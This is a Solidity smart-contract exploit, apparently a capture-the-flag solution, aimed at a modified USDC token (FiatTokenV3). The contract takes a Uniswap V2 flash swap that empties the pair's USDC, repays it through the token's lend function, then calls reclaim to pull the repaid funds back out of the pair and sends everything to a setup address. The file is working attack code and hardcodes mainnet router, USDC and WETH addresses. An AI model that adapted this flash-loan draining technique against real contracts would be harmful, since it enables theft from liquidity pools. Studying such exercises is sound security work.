pragma solidity 0.6.12;

import "@uniswap/v2-core/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/interfaces/IUniswapV2Router02.sol";
import "./FiatTokenV3.sol";
import "ds-test/test.sol";

contract Exploit is IUniswapV2Callee {
    IUniswapV2Router02 public constant router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    FiatTokenV3 public constant USDC =
        FiatTokenV3(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address public constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address setup;
    bool firstInPair;
    uint256 repaymentAmount;

    constructor(address _setup) public {
        setup = _setup;
    }

    function buyUSDC() public payable {
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(USDC);
        router.swapExactETHForTokens{value: msg.value}(
            0,
            path,
            address(this),
            type(uint256).max
        );
    }

    function exploit(IUniswapV2Pair pair, bool _firstInPair) external {
        firstInPair = _firstInPair;
        uint256 flashLoanAmount = USDC.balanceOf(address(pair)) - 1;

        if (firstInPair) {
            pair.swap(flashLoanAmount, 0, address(this), bytes("0"));
        } else {
            pair.swap(0, flashLoanAmount, address(this), bytes("0"));
        }

        USDC.reclaim(address(pair), repaymentAmount);
        USDC.transfer(setup, USDC.balanceOf(address(this)));
    }

    function uniswapV2Call(
        address,
        uint256 amountReceived1,
        uint256 amountReceived2,
        bytes calldata
    ) external override {
        uint256 amountReceived;
        if (firstInPair) {
            amountReceived = amountReceived1;
        } else {
            amountReceived = amountReceived2;
        }
        repaymentAmount = (amountReceived * 1000) / 997 + 1;
        USDC.lend(msg.sender, repaymentAmount);
    }
}
